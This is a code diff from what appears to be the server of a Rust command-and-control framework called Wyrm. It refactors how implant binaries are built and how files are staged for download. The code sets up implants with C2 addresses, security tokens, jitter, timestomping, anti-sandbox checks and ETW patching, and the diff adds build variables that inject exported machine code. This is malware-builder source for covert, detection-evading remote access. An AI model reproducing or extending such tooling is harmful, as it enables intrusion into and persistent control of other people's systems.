@@ -10,7 +10,7 @@ use crate::{
     DB_EXPORT_PATH, FILE_STORE_PATH,
     app_state::{AppState, DownloadEndpointData},
     logging::{log_error, log_error_async},
-    profiles::Profile,
+    profiles::{Profile, parse_exports_to_string_for_env},
     timestomping::timestomp_binary_compile_date,
 };
 use axum::extract::State;
@@ -181,10 +181,10 @@ pub async fn build_all_bins(
     if implant_profile_name.to_lowercase() == "all" {
         let keys: Vec<String> = profile.implants.keys().cloned().collect();
         for key in keys {
-            write_implant_to_tmp_disk(&profile, &save_path, &key, state.clone()).await?;
+            write_implant_to_tmp_folder(&profile, &save_path, &key, state.clone()).await?;
         }
     } else {
-        write_implant_to_tmp_disk(&profile, &save_path, implant_profile_name, state.clone())
+        write_implant_to_tmp_folder(&profile, &save_path, implant_profile_name, state.clone())
             .await?;
     }
 
@@ -236,7 +236,7 @@ pub async fn build_all_bins(
     Ok(buf)
 }
 
-async fn write_implant_to_tmp_disk(
+async fn write_implant_to_tmp_folder(
     profile: &Profile,
     save_path: &PathBuf,
     implant_profile_name: &str,
@@ -521,7 +521,6 @@ async fn stage_file_upload_from_users_disk(
     let out_dir = Path::new(FILE_STORE_PATH);
     let dest = out_dir.join(&data.download_name);
 
-    // Write to disk
     if let Err(e) = fs::write(&dest, &data.file_data).await {
         let serialised = serde_json::to_value(WyrmResult::Err::<String>(format!(
             "Failed to write file on C2: {e:?}",
@@ -531,30 +530,8 @@ async fn stage_file_upload_from_users_disk(
         return Some(serialised);
     }
 
-    //
-    // We can reuse the db function to stage a new agent, except we are serving our download instead.
-    // To make this work we just need to fudge a few fields which aren't needed, but it allows for
-    // database compliancy without addition additional logic, which in turn will also affect that process.
-    // todo this should probably be a `NewAgentStaging::from_x`
-    //
-    let agent_stage_template = NewAgentStaging {
-        implant_name: "-".into(),
-        default_sleep_time: 0,
-        c2_address: "-".into(),
-        c2_endpoints: vec!["-".into()],
-        staging_endpoint: data.api_endpoint.clone(),
-        pe_name: data.download_name.clone(),
-        port: 1,
-        agent_security_token: "-".into(),
-        antisandbox_trig: false,
-        antisandbox_ram: false,
-        stage_type: shared::tasks::StageType::Exe,
-        build_debug: false,
-        useragent: "".into(),
-        patch_etw: false,
-        jitter: None,
-        timestomp: None,
-    };
+    let agent_stage_template =
+        NewAgentStaging::from_staged_file_metadata(&data.api_endpoint, &data.download_name);
 
     //
     // Try insert into the database, following that, deconflict the download URI and add it into the in-memory
@@ -570,7 +547,6 @@ async fn stage_file_upload_from_users_disk(
         return Some(serialised);
     };
 
-    // If we receive an error whilst trying to upload the staged data, return an error.
     if let Err(e) = add_api_endpoint_for_staged_resource(&agent_stage_template, state.clone()).await
     {
         return stage_new_agent_error_printer(
@@ -712,6 +688,8 @@ async fn build_agent(
 
     let jitter = data.jitter.unwrap_or_default();
 
+    let exports = parse_exports_to_string_for_env(&data.exports);
+
     cmd.env("RUSTUP_TOOLCHAIN", toolchain)
         .current_dir("./implant")
         .env("AGENT_NAME", &data.implant_name)
@@ -723,6 +701,8 @@ async fn build_agent(
         .env("JITTER", jitter.to_string())
         .env("USERAGENT", &data.useragent)
         .env("STAGING_URI", &data.staging_endpoint)
+        .env("EXPORTS_JMP_WYRM", exports.export_only_jmp_wyrm)
+        .env("EXPORTS_USR_MACHINE_CODE", exports.export_machine_code)
         .env("SECURITY_TOKEN", &data.agent_security_token);
 
     cmd.arg("build");
